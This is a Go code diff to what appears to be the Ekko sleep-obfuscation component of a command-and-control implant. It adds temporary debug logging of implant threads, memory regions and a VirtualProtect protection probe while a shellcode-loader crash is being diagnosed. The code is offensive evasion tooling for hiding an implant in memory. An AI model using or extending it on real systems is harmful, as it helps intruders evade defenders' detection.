@@ -3,6 +3,9 @@ package ekko
 import (
 	"crypto/rand"
 	"errors"
+	// {{if .Config.Debug}}
+	"log"
+	// {{end}}
 	"runtime"
 	"syscall"
 	"unsafe"
@@ -118,8 +121,14 @@ func EkkoSleep(sleepTime uint64) error {
 				// Donut it starts in Donut's loader, outside the implant. One OR in one
 				// pass, so no thread is listed (and suspended) twice.
 				if (dwStartAddress >= implantBase && dwStartAddress < implantBase+implantSize) || te32.ThreadID == mainTID {
+					// {{if .Config.Debug}}
+					log.Printf("[ekko] TEMP peer   tid %d start %#x", te32.ThreadID, dwStartAddress)
+					// {{end}}
 					peers = append(peers, hThread) // stays open; the chain suspends it
 				} else {
+					// {{if .Config.Debug}}
+					log.Printf("[ekko] TEMP skip   tid %d start %#x", te32.ThreadID, dwStartAddress)
+					// {{end}}
 					windows.CloseHandle(hThread)
 				}
 			}
@@ -154,6 +163,28 @@ func ekko(sleepTime uint64, peers []windows.Handle) error {
 	if err != nil {
 		return err
 	}
+
+	// {{if .Config.Debug}}
+	// TEMP diagnostics for the shellcode crash; remove before the PR. Everything
+	// here runs before the chain, so the log reaches the file even if it crashes.
+	log.Printf("[ekko] TEMP implant %#x +%#x, mainTID %d, G1 tid %d, %d peers", implantBase, implantSize, mainTID, windows.GetCurrentThreadId(), len(peers))
+	for _, r := range regions {
+		log.Printf("[ekko] TEMP region %#x +%#x prot %#x", r.base, r.size, r.prot)
+	}
+	// Does this view accept the protections the chain asks for? Probe the last
+	// region (read-only data the beacon doesn't touch), then put it back.
+	{
+		last := regions[len(regions)-1] // never empty: the walk always covers [base, end)
+		for _, p := range []uint32{windows.PAGE_READWRITE, windows.PAGE_WRITECOPY} {
+			var old uint32
+			perr := windows.VirtualProtect(last.base, last.size, p, &old)
+			log.Printf("[ekko] TEMP probe VirtualProtect(%#x +%#x, %#x) err=%v", last.base, last.size, p, perr)
+			if perr == nil {
+				windows.VirtualProtect(last.base, last.size, old, &old)
+			}
+		}
+	}
+	// {{end}}
 
 	// Everything the timer thread reads or writes lives in one VirtualAlloc
 	// block: it never moves, the GC never frees it, and it's page-aligned, so
